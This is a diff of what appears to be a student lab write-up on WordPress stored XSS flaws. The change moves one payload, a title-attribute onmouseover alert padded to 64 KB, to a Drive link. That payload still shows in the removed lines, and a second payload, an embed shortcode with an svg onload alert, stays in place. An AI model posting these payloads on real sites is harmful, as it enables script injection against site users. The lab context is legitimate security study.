@@ -13,7 +13,7 @@ Time spent: 10 hours spent in total
     - Fixed in version: 4.6.1
   - [x] GIF Walkthrough: http://i.imgur.com/5i6YT7N.gif
   - [x] Steps to recreate: 
-    - Copy and paste this payload and post it in the comment: <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
+    - Copy and paste this payload and post it in the comment: https://drive.google.com/file/d/0BzsBD-G31f93ZXFWYkUwZTJocjA/view?usp=sharing
   - [ ] Affected source code:
 2. (Required) WordPress  Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
   - [x] Summary: Insufficient satinization in wordpress's embed shortcode function, leading to potential XSS attack.  
@@ -40,7 +40,7 @@ Time spent: 10 hours spent in total
 
 ## Assets
 
-- Payload of attack 1: <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
+- Payload of attack 1: https://drive.google.com/file/d/0BzsBD-G31f93ZXFWYkUwZTJocjA/view?usp=sharing
 
 - Payload of attack 2: [embed src='https://youtube.com/embed/11111\x3csvg onload=alert(1)\x3e'][/embed]
 
